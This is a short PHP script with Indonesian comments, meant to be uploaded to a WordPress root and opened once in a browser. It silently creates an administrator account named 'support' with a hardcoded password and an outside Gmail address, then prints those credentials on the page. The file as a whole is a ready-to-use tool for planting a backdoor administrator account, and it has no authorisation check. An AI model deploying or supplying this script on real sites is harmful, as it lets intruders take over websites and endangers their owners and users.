<?php
// File: add-admin.php
// Upload ke root WordPress kamu lalu akses via browser sekali saja

require_once("wp-load.php");
require_once("wp-includes/registration.php");

$username = "support";   // ganti sesuai keinginan
$password = "Janganhackla12@^%$#";     // ganti sesuai keinginan
$email    = "emily.clark.us@gmail.com"; // ganti sesuai keinginan

if (username_exists($username) || email_exists($email)) {
    echo "⚠️ Username atau email sudah ada!";
} else {
    $user_id = wp_create_user($username, $password, $email);
    if (is_wp_error($user_id)) {
        echo "❌ Gagal membuat user: " . $user_id->get_error_message();
    } else {
        $user = new WP_User($user_id);
        $user->set_role("administrator");
        echo "✅ User administrator berhasil dibuat!";
        echo "<br>Username: $username";
        echo "<br>Password: $password";
    }
}
?>
